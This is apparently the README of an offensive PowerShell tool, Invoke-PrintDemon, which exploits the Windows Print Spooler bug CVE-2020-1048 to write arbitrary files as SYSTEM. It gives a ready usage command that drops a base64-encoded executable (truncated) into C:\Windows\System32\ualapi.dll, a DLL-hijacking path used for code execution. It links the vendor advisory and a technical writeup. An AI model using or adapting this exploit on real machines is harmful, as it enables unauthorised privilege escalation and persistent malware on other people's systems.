# Invoke-PrintDemon
## SYNOPSIS

This script uses the PrintDemon bug to print a file (base64 encoded) anywhere as SYSTEM.

## DESCRIPTION

An elevation of privilege vulnerability exists when the Windows Print Spooler service improperly allows arbitrary writing to the file system. An attacker who successfully exploited this vulnerability could run arbitrary code with elevated system privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This script creates a printer with a given printer port and uses the PrintDemon bug to drop a file from base64 encoded string code you given anywhere on disk as SYSTEM. Simply given the printer port as a file path where you want to print to and gievn the base64 encoded string code from which you want to decode from.

```powershell
Import-Module .\Invoke-PrintDemon.ps1
Invoke-PrintDemon -PrinterName "PrintDemon" -Portname "C:\Windows\System32\ualapi.dll" -Base64code "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSG1vZGUuDQ0K...JAAAAAAAAABHbe94AwyBKwMMgSsDDIErWGSFKgIMgStYZIAqAQyBKxdngCoEDIErAwyAK0EMgSsXZ4IqAQyBKxdnhSoHDIErxWOJKgIMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

## LINK

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1048

https://windows-internals.com/printdemon-cve-2020-1048/

https://github.com/BC-SECURITY/Invoke-PrintDemon
